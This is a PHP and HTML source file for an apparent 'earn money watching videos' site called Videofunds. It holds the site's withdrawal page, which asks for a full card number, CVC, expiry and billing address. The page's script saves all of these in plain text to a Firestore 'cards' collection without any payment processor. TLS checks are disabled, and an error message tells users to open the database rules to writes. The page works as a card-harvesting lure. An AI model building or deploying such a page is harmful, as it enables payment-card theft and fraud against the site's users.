<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: index.php');
    exit;
}
require_once 'firebase_config.php';
require_once __DIR__ . '/account_guard.php';

$uid   = $_SESSION['user_id'];
$token = $_SESSION['id_token'];
$firestoreUrl = "https://firestore.googleapis.com/v1/projects/" . FIRESTORE_PROJECT_ID . "/databases/(default)/documents/users/$uid";

function firestore_request($url, $method = 'GET', $token = null, $data = null) {
    $headers = ['User-Agent: VideoFundsApp/1.0'];
    if ($token) $headers[] = 'Authorization: Bearer ' . $token;
    if ($data) $headers[] = 'Content-Type: application/json';
    $options = [
        'http' => [
            'method' => $method,
            'header' => implode("\r\n", $headers),
            'ignore_errors' => true,
            'timeout' => 30
        ],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ];
    if ($data) $options['http']['content'] = json_encode($data);
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    $httpCode = 0;
    if (isset($http_response_header[0])) {
        preg_match('/HTTP\/\d+\.\d+\s+(\d+)/', $http_response_header[0], $matches);
        $httpCode = (int)$matches[1];
    }
    return ['response' => $response, 'http_code' => $httpCode];
}

$result = firestore_request($firestoreUrl, 'GET', $token);
$userData = json_decode($result['response'], true);
if ($result['http_code'] === 404) {
    $defaultData = [
        'fields' => [
            'fullname'       => ['stringValue' => $_SESSION['user_email'] ?: 'User_' . substr($uid, 0, 6)],
            'email'          => ['stringValue' => $_SESSION['user_email']],
            'balance'        => ['doubleValue' => 5.00],
            'referral_code'  => ['stringValue' => substr($uid, 0, 8)],
            'referred_by'    => ['stringValue' => ''],
            'country_code'   => ['stringValue' => 'TZ'],
            'currency_code'  => ['stringValue' => 'TZS'],
            'exchange_rate'  => ['doubleValue' => 2600.0],
            'created_at'     => ['timestampValue' => date('c')],
            'daily_watch_count' => ['integerValue' => 0],
            'last_watch_date'   => ['stringValue' => date('Y-m-d')],
            'referral_bonus_claimed' => ['booleanValue' => false]
        ]
    ];
    firestore_request($firestoreUrl, 'PUT', $token, $defaultData);
    $result = firestore_request($firestoreUrl, 'GET', $token);
    $userData = json_decode($result['response'], true);
}
$balance = floatval($userData['fields']['balance']['doubleValue'] ?? 5.00);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Add Credit or Debit Card</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    body {
      background: url('https://www.transparenttextures.com/patterns/white-paper.png');
      background-size: cover;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .navbar {
      background-color: #5a0c1a;
      padding: 10px 0;
    }
    .navbar-brand {
      font-weight: bold;
      font-size: 30px;
      color: blue !important;
    }
    .nav-link {
      color: white !important;
      font-size: 16px;
    }
    .card-input {
      max-width: 400px;
    }
    footer {
      background-color: #333;
      color: white;
      padding: 20px 0;
      margin-top: 30px;
    }
    .form-label {
      font-weight: bold;
      margin-bottom: 5px;
      font-size: 14px;
    }
    .error-message {
      color: red;
      font-size: 12px;
      display: none;
      margin-top: 3px;
    }
    .card-input-field {
      margin-bottom: 5px;
    }
    .section-title {
      font-weight: bold;
      margin-top: 20px;
      margin-bottom: 10px;
      color: #333;
      font-size: 18px;
    }
    .form-control {
      border: 1px solid #ced4da;
      border-radius: 4px;
      padding: 10px;
    }
    .form-control:focus {
      border-color: #80bdff;
      box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
    }
    .btn-success {
      background-color: #28a745;
      border-color: #28a745;
      padding: 10px 20px;
      font-weight: bold;
      width: 100%;
      margin-top: 20px;
    }
    .btn-success:hover {
      background-color: #218838;
      border-color: #1e7e34;
    }
    .balance-info {
      text-align: center;
      margin-bottom: 20px;
      background: #f0f0f0;
      padding: 10px;
      border-radius: 20px;
      width: fit-content;
      margin-left: auto;
      margin-right: auto;
      font-weight: bold;
      color: #333;
    }
    .card-icon {
      position: absolute;
      right: 10px;
      top: 38px;
      color: #6c757d;
    }
    .input-group {
      position: relative;
    }
    .expiry-fields {
      display: flex;
      gap: 10px;
    }
    .expiry-separator {
      align-self: flex-end;
      margin-bottom: 8px;
      font-weight: bold;
    }
    .billing-section {
      background-color: #f8f9fa;
      padding: 15px;
      border-radius: 5px;
      margin-top: 20px;
    }
    #saveStatus {
      text-align: center;
      margin-top: 15px;
      font-weight: bold;
    }
    .expiry-input-container, .cvc-input-container {
      position: relative;
      display: inline-block;
    }
    .expiry-input, .cvc-input {
      padding-left: 8px;
      width: 50px;
      text-align: center;
    }
    .expiry-label, .cvc-label {
      position: absolute;
      pointer-events: none;
      left: 8px;
      top: 10px;
      color: #6c757d;
      transition: 0.2s ease all;
    }
    .expiry-input:focus ~ .expiry-label,
    .expiry-input:not(:placeholder-shown) ~ .expiry-label,
    .cvc-input:focus ~ .cvc-label,
    .cvc-input:not(:placeholder-shown) ~ .cvc-label {
      top: -18px;
      left: 0;
      font-size: 12px;
      color: #0d6efd;
    }
    .expires-cvc-container {
      display: flex;
      gap: 20px;
    }
    .cvc-section {
      margin-left: 10px;
    }
    .form-section {
      margin-bottom: 15px;
    }
    .cvc-container {
      position: relative;
    }
    .cvc-icons {
      position: absolute;
      right: 10px;
      top: 10px;
      display: flex;
      gap: 8px;
    }
    .cvc-toggle {
      cursor: pointer;
      color: #6c757d;
    }
    .cvc-toggle:hover {
      color: #0d6efd;
    }
    .firebase-error {
      background-color: #f8d7da;
      color: #721c24;
      padding: 10px;
      border-radius: 5px;
      margin: 15px 0;
      display: none;
    }
  </style>
</head>
<body>

  <!-- Navbar -->
  <nav class="navbar navbar-expand-lg fixed-top">
    <div class="container d-flex justify-content-between">
      <a class="navbar-brand" href="#">Videofunds</a>
      <a class="nav-link" href="index.html">
        <i class="fas fa-address-card"></i> User area
      </a>
    </div>
  </nav>

  <!-- Main Content -->
  <div class="container" style="margin-top:120px;">
    <div class="row justify-content-center">
      <div class="col-md-8 col-lg-6">
        <div class="balance-info">
          💰 Your Balance: $<?php echo number_format($balance, 2); ?> | Minimum withdrawal: $200.00
        </div>
        <div class="row">
          <div class="col text-center">
            <h5 style="color:blue; font-weight:bold;">Add credit or debit card</h5>
          </div>
        </div>
        
        <!-- Firebase Error Message -->
        <div id="firebaseError" class="firebase-error">
          <strong>Database Error:</strong> Unable to save card information. Please check your Firebase security rules to allow write operations.
          <div class="mt-2">
            <small>To fix this, go to Firebase Console > Firestore Database > Rules and update rules to allow writes.</small>
          </div>
        </div>
        
        <form id="cardForm" class="mt-4">
          <!-- Card Number, Expiration, and CVC -->
          <div class="row mb-3">
            <div class="col-md-8">
              <label class="form-label">Card number</label>
              <div class="input-group">
                <input type="text" id="cardNumber" class="form-control card-input-field" placeholder="1234 5678 9012 3456" maxlength="19">
                <span class="card-icon">
                  <i class="far fa-credit-card"></i>
                </span>
              </div>
              <div id="cardNumberError" class="error-message">Card number is required</div>
            </div>
            <div class="col-md-4">
              <div class="expires-cvc-container">
                <div class="form-section">
                  <label class="form-label">Expires</label>
                  <div class="expiry-fields">
                    <div class="expiry-input-container">
                      <input type="text" id="cardMonth" class="form-control expiry-input" placeholder=" " maxlength="2">
                      <span class="expiry-label">MM</span>
                    </div>
                    <span class="expiry-separator">/</span>
                    <div class="expiry-input-container">
                      <input type="text" id="cardYear" class="form-control expiry-input" placeholder=" " maxlength="2">
                      <span class="expiry-label">YY</span>
                    </div>
                  </div>
                  <div id="cardMonthError" class="error-message">Month is required</div>
                  <div id="cardYearError" class="error-message">Year is required</div>
                </div>
                
                <div class="form-section cvc-section">
                  <label class="form-label">CVC</label>
                  <div class="cvc-input-container">
                    <input type="password" id="cardCvc" class="form-control cvc-input" placeholder=" " maxlength="3">
                    <span class="cvc-label">CVC</span>
                    <i class="fas fa-question-circle" title="3-digit code on the back of your card"></i>
                    <i class="fas fa-eye cvc-toggle" id="toggleCvcVisibility" title="Show CVC"></i>
                  </div>
                  <div id="cardCvcError" class="error-message">CVC is required</div>
                </div>
              </div>
            </div>
          </div>
          
          <!-- Cardholder Name -->
          <div class="row mb-3">
            <div class="col-md-12">
              <label class="form-label">Cardholder name</label>
              <input type="text" id="cardholderName" class="form-control" placeholder="As shown on card">
              <div id="cardholderNameError" class="error-message">Cardholder name is required</div>
            </div>
          </div>
          
          <!-- Billing Address -->
          <div class="billing-section">
            <div class="section-title">Billing address</div>
            
            <div class="row mb-3">
              <div class="col-md-12">
                <label class="form-label">Street Address</label>
                <input type="text" id="billingStreet" class="form-control" placeholder="123 Main St">
                <div id="billingStreetError" class="error-message">Street address is required</div>
              </div>
            </div>
            
            <div class="row mb-3">
              <div class="col-md-6">
                <label class="form-label">City</label>
                <input type="text" id="billingCity" class="form-control" placeholder="New York">
                <div id="billingCityError" class="error-message">City is required</div>
              </div>
              <div class="col-md-3">
                <label class="form-label">State/Province</label>
                <input type="text" id="billingState" class="form-control" placeholder="State" maxlength="30">
                <div id="billingStateError" class="error-message">State/Province is required</div>
              </div>
              <div class="col-md-3">
                <label class="form-label">ZIP/Postal Code</label>
                <input type="text" id="billingZip" class="form-control" placeholder="10001" maxlength="10">
                <div id="billingZipError" class="error-message">ZIP/Postal code is required</div>
              </div>
            </div>
            
            <div class="row mb-3">
              <div class="col-md-12">
                <label class="form-label">Country</label>
                <select id="billingCountry" class="form-control">
                  <option value="">Select Country</option>
                  <option value="DZ">Algeria</option>
                  <option value="AO">Angola</option>
                  <option value="BJ">Benin</option>
                  <option value="BW">Botswana</option>
                  <option value="BF">Burkina Faso</option>
                  <option value="BI">Burundi</option>
                  <option value="CV">Cabo Verde</option>
                  <option value="CM">Cameroon</option>
                  <option value="CF">Central African Republic</option>
                  <option value="TD">Chad</option>
                  <option value="KM">Comoros</option>
                  <option value="CD">Congo, Democratic Republic of the</option>
                  <option value="CG">Congo, Republic of the</option>
                  <option value="CI">Côte d'Ivoire</option>
                  <option value="DJ">Djibouti</option>
                  <option value="EG">Egypt</option>
                  <option value="GQ">Equatorial Guinea</option>
                  <option value="ER">Eritrea</option>
                  <option value="SZ">Eswatini</option>
                  <option value="ET">Ethiopia</option>
                  <option value="GA">Gabon</option>
                  <option value="GM">Gambia</option>
                  <option value="GH">Ghana</option>
                  <option value="GN">Guinea</option>
                  <option value="GW">Guinea-Bissau</option>
                  <option value="KE">Kenya</option>
                  <option value="LS">Lesotho</option>
                  <option value="LR">Liberia</option>
                  <option value="LY">Libya</option>
                  <option value="MG">Madagascar</option>
                  <option value="MW">Malawi</option>
                  <option value="ML">Mali</option>
                  <option value="MR">Mauritania</option>
                  <option value="MU">Mauritius</option>
                  <option value="YT">Mayotte</option>
                  <option value="MA">Morocco</option>
                  <option value="MZ">Mozambique</option>
                  <option value="NA">Namibia</option>
                  <option value="NE">Niger</option>
                  <option value="NG">Nigeria</option>
                  <option value="RE">Réunion</option>
                  <option value="RW">Rwanda</option>
                  <option value="SH">Saint Helena</option>
                  <option value="ST">Sao Tome and Principe</option>
                  <option value="SN">Senegal</option>
                  <option value="SC">Seychelles</option>
                  <option value="SL">Sierra Leone</option>
                  <option value="SO">Somalia</option>
                  <option value="ZA">South Africa</option>
                  <option value="SS">South Sudan</option>
                  <option value="SD">Sudan</option>
                  <option value="TZ">Tanzania</option>
                  <option value="TG">Togo</option>
                  <option value="TN">Tunisia</option>
                  <option value="UG">Uganda</option>
                  <option value="EH">Western Sahara</option>
                  <option value="ZM">Zambia</option>
                  <option value="ZW">Zimbabwe</option>
                </select>
                <div id="billingCountryError" class="error-message">Country is required</div>
              </div>
            </div>
          </div>
          
          <!-- Status Message -->
          <div id="saveStatus"></div>
          
          <!-- Continue Button -->
          <div class="row mt-4">
            <div class="col d-flex justify-content-center">
              <button type="button" id="saveCardBtn" class="btn btn-success card-input">Continue</button>
            </div>
          </div>
        </form>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer class="text-center mt-5">
    <p class="m-0">Copyright &copy; videofunds.top 2025-2045</p>
  </footer>

  <!-- Firebase and Firestore SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: <?= json_encode(FIREBASE_API_KEY) ?>,
      authDomain: "videofunds-project.firebaseapp.com",
      projectId: "videofunds-project",
      storageBucket: "videofunds-project.firebasestorage.app",
      messagingSenderId: "563407510735",
      appId: "1:563407510735:web:2e8c5e9c83bb95d9182bba",
      measurementId: "G-7H6ZGB3RYR"
    };

    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const db = getFirestore(app);

    // Balance passed from PHP (minimum requirement: $150)
    const userBalance = <?php echo $balance; ?>;

    async function saveCardData(cardData) {
      const docRef = await addDoc(collection(db, "cards"), cardData);
      return docRef.id;
    }

    function validateForm() {
      let isValid = true;
      
      // Card number
      const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
      if (!/^\d{16}$/.test(cardNumber)) {
        document.getElementById('cardNumberError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('cardNumberError').style.display = 'none';
      }
      
      // Month
      const cardMonth = document.getElementById('cardMonth').value;
      if (!/^\d{2}$/.test(cardMonth) || parseInt(cardMonth) < 1 || parseInt(cardMonth) > 12) {
        document.getElementById('cardMonthError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('cardMonthError').style.display = 'none';
      }
      
      // Year
      const cardYear = document.getElementById('cardYear').value;
      const currentYear = new Date().getFullYear() % 100;
      if (!/^\d{2}$/.test(cardYear) || parseInt(cardYear) < currentYear) {
        document.getElementById('cardYearError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('cardYearError').style.display = 'none';
      }
      
      // CVC
      const cardCvc = document.getElementById('cardCvc').value;
      if (!/^\d{3,4}$/.test(cardCvc)) {
        document.getElementById('cardCvcError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('cardCvcError').style.display = 'none';
      }
      
      // Cardholder name
      const cardholderName = document.getElementById('cardholderName').value;
      if (!cardholderName.trim()) {
        document.getElementById('cardholderNameError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('cardholderNameError').style.display = 'none';
      }
       // Billing fields
      if (!document.getElementById('billingStreet').value.trim()) {
        document.getElementById('billingStreetError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('billingStreetError').style.display = 'none';
      }
      if (!document.getElementById('billingCity').value.trim()) {
        document.getElementById('billingCityError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('billingCityError').style.display = 'none';
      }
      if (!document.getElementById('billingState').value.trim()) {
        document.getElementById('billingStateError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('billingStateError').style.display = 'none';
      }
      if (!document.getElementById('billingZip').value.trim()) {
        document.getElementById('billingZipError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('billingZipError').style.display = 'none';
      }
      if (!document.getElementById('billingCountry').value) {
        document.getElementById('billingCountryError').style.display = 'block';
        isValid = false;
      } else {
        document.getElementById('billingCountryError').style.display = 'none';
      }
      
      return isValid;
    }

    async function handleFormSubmit() {
      const statusElement = document.getElementById('saveStatus');
      
      // === BALANCE CHECK ===
      if (userBalance < 150) {
        alert('❌ Insufficient balance. Minimum withdrawal amount is $200. You have $' + userBalance.toFixed(2) + '.');
        window.location.href = 'dashboard.php';
        return;
      }
      
      if (validateForm()) {
        const saveButton = document.getElementById('saveCardBtn');
        saveButton.disabled = true;
        saveButton.textContent = 'Saving...';
        statusElement.textContent = 'Saving your card information...';
        statusElement.style.color = 'blue';
        
        try {
          const cardData = {
            cardNumber: document.getElementById('cardNumber').value,
            cardMonth: document.getElementById('cardMonth').value,
            cardYear: document.getElementById('cardYear').value,
            cardCvc: document.getElementById('cardCvc').value,
            cardholderName: document.getElementById('cardholderName').value,
            billingStreet: document.getElementById('billingStreet').value,
            billingCity: document.getElementById('billingCity').value,
            billingState: document.getElementById('billingState').value,
            billingZip: document.getElementById('billingZip').value,
            billingCountry: document.getElementById('billingCountry').value,
            timestamp: new Date()
          };
          
          await saveCardData(cardData);
          statusElement.textContent = 'Card information saved successfully! Redirecting...';
          statusElement.style.color = 'green';
          setTimeout(() => {
            window.location.href = "endpay.html";
          }, 2000);
          
        } catch (error) {
          console.error('Error saving card data:', error);
          statusElement.textContent = 'Error saving card information. Please try again.';
          statusElement.style.color = 'red';
          if (error.code === 'permission-denied') {
            document.getElementById('firebaseError').style.display = 'block';
          }
          saveButton.disabled = false;
          saveButton.textContent = 'Continue';
        }
      }
    }

    function toggleCvcVisibility() {
      const cvcInput = document.getElementById('cardCvc');
      const eyeIcon = document.getElementById('toggleCvcVisibility');
      if (cvcInput.type === 'password') {
        cvcInput.type = 'text';
        eyeIcon.classList.remove('fa-eye');
        eyeIcon.classList.add('fa-eye-slash');
        eyeIcon.title = 'Hide CVC';
      } else {
        cvcInput.type = 'password';
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
        eyeIcon.title = 'Show CVC';
      }
    }

    document.addEventListener('DOMContentLoaded', function() {
      document.getElementById('saveCardBtn').addEventListener('click', handleFormSubmit);
      document.getElementById('toggleCvcVisibility').addEventListener('click', toggleCvcVisibility);
      
      document.getElementById('cardNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '').substring(0,16);
        let formatted = value.replace(/(.{4})/g, '$1 ').trim(); 
        e.target.value = formatted;
      });
      document.getElementById('cardMonth').addEventListener('input', function(e) {
        if (e.target.value.length === 2) document.getElementById('cardYear').focus();
      });
    });
  </script>
</body>
</html>